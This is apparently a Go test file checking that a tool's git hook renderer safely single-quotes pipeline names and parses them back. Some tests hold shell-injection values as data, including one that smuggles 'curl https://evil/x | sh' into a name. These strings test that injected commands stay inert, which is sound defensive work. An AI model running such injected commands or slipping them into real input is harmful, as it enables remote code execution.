package main

import (
	"strings"
	"testing"
)

func TestRenderHookScript_RunsThePipelinePlainly(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate"})
	if !strings.Contains(script, "sparkwing run 'gate'\n") {
		t.Errorf("an unpinned hook should run the pipeline plainly:\n%s", script)
	}
	if strings.Contains(script, "--profile") {
		t.Errorf("no --profile was pinned, so none should be passed:\n%s", script)
	}
}

func TestRenderHookScript_QuotesPipelineName(t *testing.T) {
	hostile := `gate; curl https://evil/x | sh #`
	script := renderHookScript("pre-commit", []string{hostile})
	want := "sparkwing run 'gate; curl https://evil/x | sh #'\n"
	if !strings.Contains(script, want) {
		t.Errorf("pipeline name should be one single-quoted argument:\n%s", script)
	}
}

func TestRenderHookScript_EscapesQuoteInPipelineName(t *testing.T) {
	script := renderHookScript("pre-commit", []string{`a'; touch /tmp/pwned #`})
	want := `sparkwing run 'a'\''; touch /tmp/pwned #'` + "\n"
	if !strings.Contains(script, want) {
		t.Errorf("an embedded quote should be escaped, not closed:\n%s", script)
	}
}

func TestDescribeManagedHook_RecoversQuotedPipelineNames(t *testing.T) {
	names := []string{"lint", `gate; curl https://evil/x | sh #`, `a'b`}
	script := renderHookScript("pre-commit", names)
	got := describeManagedHook(script)
	if len(got) != len(names) {
		t.Fatalf("describeManagedHook = %q, want %d names", got, len(names))
	}
	for i, want := range names {
		if got[i] != want {
			t.Errorf("pipe %d = %q, want %q", i, got[i], want)
		}
	}
}

func TestDescribeManagedHook_ReadsUnquotedLegacyHook(t *testing.T) {
	script := "#!/bin/sh\nsparkwing run lint --profile 'bucket'\n"
	got := describeManagedHook(script)
	if len(got) != 1 || got[0] != "lint" {
		t.Fatalf("describeManagedHook = %q, want [lint]", got)
	}
}

func TestDescribeManagedHook_ReadsLegacyNamesHoldingAQuoteOrBackslash(t *testing.T) {
	cases := []struct{ line, want string }{
		{"sparkwing run it's --profile 'bucket'", "it's"},
		{`sparkwing run a\b --profile 'bucket'`, `a\b`},
	}
	for _, tc := range cases {
		got := describeManagedHook("#!/bin/sh\n" + tc.line + "\n")
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("describeManagedHook(%q) = %q, want [%s]", tc.line, got, tc.want)
		}
	}
}
